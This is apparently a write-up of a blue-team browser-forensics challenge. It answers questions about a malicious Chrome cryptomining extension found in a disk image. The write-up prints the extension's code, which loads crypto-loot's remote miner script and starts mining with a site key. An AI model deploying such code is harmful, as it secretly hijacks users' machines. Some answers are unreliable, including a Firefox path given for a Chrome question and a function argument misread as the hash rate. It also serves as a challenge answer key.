# Browser Forensics - Cryptominer

Link: [BTLO](https://blueteamlabs.online/home/challenge/browser-forensics-cryptominer-aa00f593cb)

## Requirements

- FTK Imager

## Questions

###How many browser-profiles are present in Google Chrome? (1 points)

`2`

Open the provided image as Evidence Item with the FTK Imager and navigate through the image to `PHYSICALDRIVE:0\[root]\Users\IEUser\App Data\Roaming\Mozilla\Firefox\Profiles`

###What is the name of the browser theme installed on Google Chrome? (1 points)

`Earth in space`

Nabigate to `PHYSICALDRIVE:0\[root]\Users\IEUser\App Data\Local\Google\Chrome\User Data\Default\Extensions\iiihlpikmpijdopbaegjibndhpgjmjfe\1.6_O\manifest.json` where you can find details about the theme:

```
{
   "app": {
      "launch": {
         "web_url": "http://atavi.com/browser-themes/?from=chrome-themes&tid=earth_in_space"
      },
      "urls": [ "http://atavi.com/browser-themes/" ]
   },
   "default_locale": "ru",
   "description": "__MSG_appDesc__",
...
}
```

### Identify the Extension ID and Extension Name of the cryptominer (2 points)

`egnfmleidkolminhjlkaomjefheafbbb DFP Cryptocurrency Miner`

Check the extension details in the list and this one sticked out with following code:

```
<script src="https://crypto-loot.com/lib/miner.min.js"></script>
<script>
var miner=new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0',
        {
        threads:3,autoThreads:false,throttle:0.2,
        }
);
miner.start();
</script>
<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond(20);
		var totalHashes = miner.getTotalHashes(256000000);
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
</script>
```

### What is the description text of this extension? (1 points)

`Allows staff members to mine cryptocurrency in the background of their web browser`

Can be found in the manifest file.

### What is the name of the specific javascript web miner used in the browser extension? (1 points)

`crypto-loot`

From the exported java code above.

### How many hashes is the crypto miner calculating per second?

`20`

From the exported java code above.

### What is the public key associated with this mining activity? (1 points)

`b23efb4650150d5bc5b2de6f05267272cada06d985a0`

From the exported java code above.

### What is the URL of the official Twitter page of the javascript web miner?

`twitter.com/CryptoLootMiner`

From their webpage https://twitter.com/CryptoLootMiner
